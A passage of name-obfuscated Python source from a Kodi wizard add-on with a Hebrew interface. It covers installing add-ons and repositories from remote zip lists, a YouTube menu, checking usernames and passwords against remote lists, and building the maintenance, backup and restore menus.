							OOOOO0O00OOO0O00O =xbmcaddon .Addon (id =O0OOO0000OO00OOO0 ).getAddonInfo ('path')#line:2474
							if os .path .exists (OOOOO0O00OOO0O00O ):#line:2475
								OOOO0OO0O0000000O ="[COLOR green][Installed][/COLOR] %s"%OOOO0OO0O0000000O #line:2476
						except :#line:2477
							pass #line:2478
						OO00OO00O000O0O00 +=1 #line:2479
						addFile (OOOO0OO0O0000000O ,'addoninstall',O0OOO0000OO00OOO0 ,OO0OOO0OOOOO000O0 ,description =OOOOOOO0O0O000OO0 ,icon =OOO00OOO000O0000O ,fanart =O00O0O00000OOOO0O ,themeit =THEME2 )#line:2480
					if OO00OO00O000O0O00 <1 :#line:2481
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2482
			else :#line:2483
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2484
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2485
		else :#line:2486
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2487
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2488
			addFile ('%s'%O000OOO0OOO0OOO00 ,'',themeit =THEME3 )#line:2489
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2490
	setView ('files','viewType')#line:2491
def addonInstaller (OO0OO000O0O0O0000 ,O000O0O000OOO0O00 ):#line:2493
	if not ADDONFILE =='http://':#line:2494
		O0O0O0OO0OOO0O00O =wiz .workingURL (O000O0O000OOO0O00 )#line:2495
		if O0O0O0OO0OOO0O00O ==True :#line:2496
			O00OOOO0OOOOOO00O =wiz .openURL (O000O0O000OOO0O00 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2497
			O0O00OOOOOO0O00O0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO0OO000O0O0O0000 ).findall (O00OOOO0OOOOOO00O )#line:2498
			if len (O0O00OOOOOO0O00O0 )>0 :#line:2499
				for O000O00O000000O0O ,O000O0O000OOO0O00 ,OO0OOOO00O00OO000 ,OO0O0OOO0O0O00OOO ,O00000OO00OO00O00 ,O00OO0O0OO0O0OO00 ,O0OOOO0O0OO0OOOO0 ,OO0000O0OO0O0OOO0 ,O0OOOO0OO0OO0OO00 in O0O00OOOOOO0O00O0 :#line:2500
					if os .path .exists (os .path .join (ADDONS ,OO0OO000O0O0O0000 )):#line:2501
						OOOO00000000OO0OO =['Launch Addon','Remove Addon']#line:2502
						O00O0O0O0O000OOO0 =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OOOO00000000OO0OO )#line:2503
						if O00O0O0O0O000OOO0 ==0 :#line:2504
							wiz .ebi ('RunAddon(%s)'%OO0OO000O0O0O0000 )#line:2505
							xbmc .sleep (1000 )#line:2506
							return True #line:2507
						elif O00O0O0O0O000OOO0 ==1 :#line:2508
							wiz .cleanHouse (os .path .join (ADDONS ,OO0OO000O0O0O0000 ))#line:2509
							try :wiz .removeFolder (os .path .join (ADDONS ,OO0OO000O0O0O0000 ))#line:2510
							except :pass #line:2511
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OO000O0O0O0000 ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2512
								removeAddonData (OO0OO000O0O0O0000 )#line:2513
							wiz .refresh ()#line:2514
							return True #line:2515
						else :#line:2516
							return False #line:2517
					OO0O0O0O00OOO00OO =os .path .join (ADDONS ,OO0OOOO00O00OO000 )#line:2518
					if not OO0OOOO00O00OO000 .lower ()=='none'and not os .path .exists (OO0O0O0O00OOO00OO ):#line:2519
						wiz .log ("Repository not installed, installing it")#line:2520
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,OO0OO000O0O0O0000 ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0OOOO00O00OO000 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2521
							OOOO0O0OOOO0O0O0O =wiz .parseDOM (wiz .openURL (OO0O0OOO0O0O00OOO ),'addon',ret ='version',attrs ={'id':OO0OOOO00O00OO000 })#line:2522
							if len (OOOO0O0OOOO0O0O0O )>0 :#line:2523
								OOOO0O0O0OO0OOOO0 ='%s%s-%s.zip'%(O00000OO00OO00O00 ,OO0OOOO00O00OO000 ,OOOO0O0OOOO0O0O0O [0 ])#line:2524
								wiz .log (OOOO0O0O0OO0OOOO0 )#line:2525
								if KODIV >=17 :wiz .addonDatabase (OO0OOOO00O00OO000 ,1 )#line:2526
								installAddon (OO0OOOO00O00OO000 ,OOOO0O0O0OO0OOOO0 )#line:2527
								wiz .ebi ('UpdateAddonRepos()')#line:2528
								wiz .log ("Installing Addon from Kodi")#line:2530
								O00OOO000O0000OO0 =installFromKodi (OO0OO000O0O0O0000 )#line:2531
								wiz .log ("Install from Kodi: %s"%O00OOO000O0000OO0 )#line:2532
								if O00OOO000O0000OO0 :#line:2533
									wiz .refresh ()#line:2534
									return True #line:2535
							else :#line:2536
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO0OOOO00O00OO000 )#line:2537
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(OO0OO000O0O0O0000 ,OO0OOOO00O00OO000 ))#line:2538
					elif OO0OOOO00O00OO000 .lower ()=='none':#line:2539
						wiz .log ("No repository, installing addon")#line:2540
						OO00OOO00O000OOO0 =OO0OO000O0O0O0000 #line:2541
						OO0OOOOO000O0O0OO =O000O0O000OOO0O00 #line:2542
						installAddon (OO0OO000O0O0O0000 ,O000O0O000OOO0O00 )#line:2543
						wiz .refresh ()#line:2544
						return True #line:2545
					else :#line:2546
						wiz .log ("Repository installed, installing addon")#line:2547
						O00OOO000O0000OO0 =installFromKodi (OO0OO000O0O0O0000 ,False )#line:2548
						if O00OOO000O0000OO0 :#line:2549
							wiz .refresh ()#line:2550
							return True #line:2551
					if os .path .exists (os .path .join (ADDONS ,OO0OO000O0O0O0000 )):return True #line:2552
					OOOO0O0O000OOOO0O =wiz .parseDOM (wiz .openURL (OO0O0OOO0O0O00OOO ),'addon',ret ='version',attrs ={'id':OO0OO000O0O0O0000 })#line:2553
					if len (OOOO0O0O000OOOO0O )>0 :#line:2554
						O000O0O000OOO0O00 ="%s%s-%s.zip"%(O000O0O000OOO0O00 ,OO0OO000O0O0O0000 ,OOOO0O0O000OOOO0O [0 ])#line:2555
						wiz .log (str (O000O0O000OOO0O00 ))#line:2556
						if KODIV >=17 :wiz .addonDatabase (OO0OO000O0O0O0000 ,1 )#line:2557
						installAddon (OO0OO000O0O0O0000 ,O000O0O000OOO0O00 )#line:2558
						wiz .refresh ()#line:2559
					else :#line:2560
						wiz .log ("no match");return False #line:2561
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2562
		else :wiz .log ("[Addon Installer] Text File: %s"%O0O0O0OO0OOO0O00O )#line:2563
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2564
def installFromKodi (OO0O0O000OO00O000 ,over =True ):#line:2566
	if over ==True :#line:2567
		xbmc .sleep (2000 )#line:2568
	wiz .ebi ('RunPlugin(plugin://%s)'%OO0O0O000OO00O000 )#line:2570
	if not wiz .whileWindow ('yesnodialog'):#line:2571
		return False #line:2572
	xbmc .sleep (1000 )#line:2573
	if wiz .whileWindow ('okdialog'):#line:2574
		return False #line:2575
	wiz .whileWindow ('progressdialog')#line:2576
	if os .path .exists (os .path .join (ADDONS ,OO0O0O000OO00O000 )):return True #line:2577
	else :return False #line:2578
def installAddon (O0OOO00O000O0O0OO ,O000OOO00O0O000O0 ):#line:2580
	if not wiz .workingURL (O000OOO00O0O000O0 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0OOO00O000O0O0OO ,COLOR2 ));return #line:2581
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2582
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO00O000O0O0OO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2583
	OOOOOO0O0000000OO =O000OOO00O0O000O0 .split ('/')#line:2584
	OOO00O0OO0OOOO000 =os .path .join (PACKAGES ,OOOOOO0O0000000OO [-1 ])#line:2585
	try :os .remove (OOO00O0OO0OOOO000 )#line:2586
	except :pass #line:2587
	downloader .download (O000OOO00O0O000O0 ,OOO00O0OO0OOOO000 ,DP )#line:2588
	O0O00O000OO000O00 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO00O000O0O0OO )#line:2589
	DP .update (0 ,O0O00O000OO000O00 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2590
	OOOOO00OO00O0OO00 ,O00O0OO000OOOOO00 ,OOOOOO0000O000O0O =extract .all (OOO00O0OO0OOOO000 ,ADDONS ,DP ,title =O0O00O000OO000O00 )#line:2591
	DP .update (0 ,O0O00O000OO000O00 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2592
	installed (O0OOO00O000O0O0OO )#line:2593
	installDep (O0OOO00O000O0O0OO ,DP )#line:2594
	DP .close ()#line:2595
	wiz .ebi ('UpdateAddonRepos()')#line:2596
	wiz .ebi ('UpdateLocalAddons()')#line:2597
	wiz .refresh ()#line:2598
def installDep (O0O00O0O0O00000OO ,DP =None ):#line:2600
	O0OO00O0O0O0OO0OO =os .path .join (ADDONS ,O0O00O0O0O00000OO ,'addon.xml')#line:2601
	if os .path .exists (O0OO00O0O0O0OO0OO ):#line:2602
		OOOOOOOO00000OOOO =open (O0OO00O0O0O0OO0OO ,mode ='r');O00OOOOO000O0OO00 =OOOOOOOO00000OOOO .read ();OOOOOOOO00000OOOO .close ();#line:2603
		OO00O0OO0O00O0O00 =wiz .parseDOM (O00OOOOO000O0OO00 ,'import',ret ='addon')#line:2604
		for OO0O000OOOOOO00O0 in OO00O0OO0O00O0O00 :#line:2605
			if not 'xbmc.python'in OO0O000OOOOOO00O0 :#line:2606
				if not DP ==None :#line:2607
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0O000OOOOOO00O0 ))#line:2608
				wiz .createTemp (OO0O000OOOOOO00O0 )#line:2609
def installed (O00O0O0OO0O0O0O00 ):#line:2636
	OO0O00O00OO000O00 =os .path .join (ADDONS ,O00O0O0OO0O0O0O00 ,'addon.xml')#line:2637
	if os .path .exists (OO0O00O00OO000O00 ):#line:2638
		try :#line:2639
			OO0OOO0OO00O00000 =open (OO0O00O00OO000O00 ,mode ='r');O0OOO00O0O000OOOO =OO0OOO0OO00O00000 .read ();OO0OOO0OO00O00000 .close ()#line:2640
			OO00OO0OO0OO000O0 =wiz .parseDOM (O0OOO00O0O000OOOO ,'addon',ret ='name',attrs ={'id':O00O0O0OO0O0O0O00 })#line:2641
			OO0O0OO00O0OOOO00 =os .path .join (ADDONS ,O00O0O0OO0O0O0O00 ,'icon.png')#line:2642
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OO0OO0OO000O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0O0OO00O0OOOO00 )#line:2643
		except :pass #line:2644
def youtubeMenu (url =None ):#line:2646
	if not YOUTUBEFILE =='http://':#line:2647
		if url ==None :#line:2648
			OO0000O00O00O0OO0 =wiz .workingURL (YOUTUBEFILE )#line:2649
			OOOOO0O00O0OOO0O0 =uservar .YOUTUBEFILE #line:2650
		else :#line:2651
			OO0000O00O00O0OO0 =wiz .workingURL (url )#line:2652
			OOOOO0O00O0OOO0O0 =url #line:2653
		if OO0000O00O00O0OO0 ==True :#line:2654
			O0OO000OO0OOO00O0 =wiz .openURL (OOOOO0O00O0OOO0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2655
			O0000000O00O0OOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0OO000OO0OOO00O0 )#line:2656
			if len (O0000000O00O0OOO0 )>0 :#line:2657
				for O000OOOOO00OO0O0O ,O0O0OOO00OO0O00O0 ,url ,O0O00O000O0000OO0 ,O0O0OO000OOOOO000 ,OO0O0OO000O00OO0O in O0000000O00O0OOO0 :#line:2658
					if O0O0OOO00OO0O00O0 .lower ()=="yes":#line:2659
						addDir ("[B]%s[/B]"%O000OOOOO00OO0O0O ,'youtube',url ,description =OO0O0OO000O00OO0O ,icon =O0O00O000O0000OO0 ,fanart =O0O0OO000OOOOO000 ,themeit =THEME3 )#line:2660
					else :#line:2661
						addFile (O000OOOOO00OO0O0O ,'viewVideo',url =url ,description =OO0O0OO000O00OO0O ,icon =O0O00O000O0000OO0 ,fanart =O0O0OO000OOOOO000 ,themeit =THEME2 )#line:2662
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2663
		else :#line:2664
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2665
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2666
			addFile ('%s'%OO0000O00O00O0OO0 ,'',themeit =THEME3 )#line:2667
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2668
	setView ('files','viewType')#line:2669
def STARTP ():#line:2670
	O0OOOOO00000OOO0O =(ADDON .getSetting ("pass"))#line:2671
	if BUILDNAME =="":#line:2672
	 if not NOTIFY =='true':#line:2673
          O00O00000O000OO00 =wiz .workingURL (NOTIFICATION )#line:2674
	 if not NOTIFY2 =='true':#line:2675
          O00O00000O000OO00 =wiz .workingURL (NOTIFICATION2 )#line:2676
	 if not NOTIFY3 =='true':#line:2677
          O00O00000O000OO00 =wiz .workingURL (NOTIFICATION3 )#line:2678
	OOOOOOO0O0O00OOOO =O0OOOOO00000OOO0O #line:2679
	O00O00000O000OO00 =urllib2 .Request (SPEED )#line:2680
	O000O000O000O0OOO =urllib2 .urlopen (O00O00000O000OO00 )#line:2681
	O000O0OOO0O00O00O =O000O000O000O0OOO .readlines ()#line:2683
	OO00OO00O000OO0OO =0 #line:2687
	for OO000OOO00000OO0O in O000O0OOO0O00O00O :#line:2688
		if OO000OOO00000OO0O .split (' ==')[0 ]==O0OOOOO00000OOO0O or OO000OOO00000OO0O .split ()[0 ]==O0OOOOO00000OOO0O :#line:2689
			OO00OO00O000OO0OO =1 #line:2690
			break #line:2691
	if OO00OO00O000OO0OO ==0 :#line:2692
					O0OO00000000O00O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2693
					if O0OO00000000O00O0 :#line:2695
						ADDON .openSettings ()#line:2697
						sys .exit ()#line:2699
					else :#line:2700
						sys .exit ()#line:2701
	return 'ok'#line:2705
def STARTP2 ():#line:2706
	OO000O0O0000O000O =(ADDON .getSetting ("user"))#line:2707
	O0OO0OOOOOO0OOO00 =(UNAME )#line:2709
	OO000OO0O00O00OOO =urllib2 .urlopen (O0OO0OOOOOO0OOO00 )#line:2710
	O0OOO0O000OO0OOO0 =OO000OO0O00O00OOO .readlines ()#line:2711
	OOOOO000OOO0O000O =0 #line:2712
	for O0OO00000O0OOOO0O in O0OOO0O000OO0OOO0 :#line:2715
		if O0OO00000O0OOOO0O .split (' ==')[0 ]==OO000O0O0000O000O or O0OO00000O0OOOO0O .split ()[0 ]==OO000O0O0000O000O :#line:2716
			OOOOO000OOO0O000O =1 #line:2717
			break #line:2718
	if OOOOO000OOO0O000O ==0 :#line:2719
		O000OO00O00OO0O0O =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2720
		if O000OO00O00OO0O0O :#line:2722
			ADDON .openSettings ()#line:2724
			sys .exit ()#line:2727
		else :#line:2728
			sys .exit ()#line:2729
	return 'ok'#line:2733
def passandpin ():#line:2734
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2735
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2736
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2737
def passandUsername ():#line:2738
	ADDON .openSettings ()#line:2739
def folderback ():#line:2742
    OOO00O000O000000O =ADDON .getSetting ("path")#line:2743
    if OOO00O000O000000O :#line:2744
      OOO00O000O000000O =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2745
      ADDON .setSetting ("path",OOO00O000O000000O )#line:2746
def backmyupbuild ():#line:2749
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2753
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2754
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2755
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2757
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2758
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2759
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2761
def maintMenu (view =None ):#line:2765
	OO00O0OOO0OOOO00O ='[B][COLOR green]ON[/COLOR][/B]';O00OOO0O000O0O000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2767
	OO00O00O00000OO00 ='true'if AUTOCLEANUP =='true'else 'false'#line:2768
	O0O000O0OO000O0O0 ='true'if AUTOCACHE =='true'else 'false'#line:2769
	OOO000O0OO00O0OO0 ='true'if AUTOPACKAGES =='true'else 'false'#line:2770
	OO000000O0OOOO00O ='true'if AUTOTHUMBS =='true'else 'false'#line:2771
	O0O00OO0OO00OOO00 ='true'if SHOWMAINT =='true'else 'false'#line:2772
	O0OO00O0OOO0O00OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2773
	OO00O0OOOO0O0O0O0 ='true'if INCLUDEALL =='true'else 'false'#line:2774
	OOO000OO00OO000OO ='true'if THIRDPARTY =='true'else 'false'#line:2775
	if wiz .Grab_Log (True )==False :OOOO000O00OO000O0 =0 #line:2776
	else :OOOO000O00OO000O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2777
	if wiz .Grab_Log (True ,True )==False :OOO000OO00O0O0O0O =0 #line:2778
	else :OOO000OO00O0O0O0O =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2779
	O00O00O00000OOO0O =int (OOOO000O00OO000O0 )+int (OOO000OO00O0O0O0O )#line:2780
	OOO00O00000OO0O0O =str (O00O00O00000OOO0O )+' Error(s) Found'if O00O00O00000OOO0O >0 else 'None Found'#line:2781
	O000OOOO00O0OO0O0 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2782
	if OO00O0OOOO0O0O0O0 =='true':#line:2783
		O00OO0OOOO0O0OO0O ='true'#line:2784
		O0OO0O0OOOOO0O000 ='true'#line:2785
		O0000O0OO00O00O0O ='true'#line:2786
		O00O00000O0O0OOO0 ='true'#line:2787
		O000O0OO0000OO00O ='true'#line:2788
		O00O0OOOO0OO00000 ='true'#line:2789
		OO00000OO00OO0000 ='true'#line:2790
		OO0000O00OOOOO00O ='true'#line:2791
	else :#line:2792
		O00OO0OOOO0O0OO0O ='true'if INCLUDEBOB =='true'else 'false'#line:2793
		O0OO0O0OOOOO0O000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2794
		O0000O0OO00O00O0O ='true'if INCLUDESPECTO =='true'else 'false'#line:2795
		O00O00000O0O0OOO0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2796
		O000O0OO0000OO00O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2797
		O00O0OOOO0OO00000 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2798
		OO00000OO00OO0000 ='true'if INCLUDESALTS =='true'else 'false'#line:2799
		OO0000O00OOOOO00O ='true'if INCLUDESALTSHD =='true'else 'false'#line:2800
	O00000OO0OOOO0O00 =wiz .getSize (PACKAGES )#line:2801
	O0OO0OO0O00O0O000 =wiz .getSize (THUMBS )#line:2802
	O00O0OOO00O0O00OO =wiz .getCacheSize ()#line:2803
	O00OO0OO000O00O00 =O00000OO0OOOO0O00 +O0OO0OO0O00O0O000 +O00O0OOO00O0O00OO #line:2804
	O000O0O0OO0OOO0OO =['Daily','Always','3 Days','Weekly']#line:2805
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2806
	if view =="clean"or SHOWMAINT =='true':#line:2807
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OO0OO000O00O00 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2808
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O0OOO00O0O00OO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2809
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00000OO0OOOO0O00 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2810
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0OO0OO0O00O0O000 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2811
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2812
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2813
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2814
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2815
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2816
	if view =="addon"or SHOWMAINT =='false':#line:2817
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2818
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2819
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2820
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2821
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2822
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2824
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2825
	if view =="misc"or SHOWMAINT =='true':#line:2826
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2827
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('View Errors in Log: %s'%(OOO00O00000OO0O0O ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2834
		addFile ('Clear Wizard Log File%s'%O000OOOO00O0OO0O0 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2835
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2836
	if view =="backup"or SHOWMAINT =='true':#line:2837
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2845
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2846
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2847
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2849
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2850
	if view =="tweaks"or SHOWMAINT =='true':#line:2851
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2852
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		else :#line:2854
			if os .path .exists (ADVANCED ):#line:2855
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2856
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2857
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2859
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2860
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2861
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2862
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2864
	addFile ('Show All Maintenance: %s'%O0O00OO0OO00OOO00 .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2865
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2866
	addFile ('Third Party Wizards: %s'%OOO000OO00OO000OO .replace ('true',OO00O0OOO0OOOO00O ).replace ('false',O00OOO0O000O0O000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2867
	if OOO000OO00OO000OO =='true':#line:2868
		O000O00OO0O0O0OO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2869
		OO0O0OOO0OOOO0OOO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2870
		O00O000OO0O0O0O00 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2871
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000O00OO0O0O0OO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0O0OOO0OOOO0OOO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2873
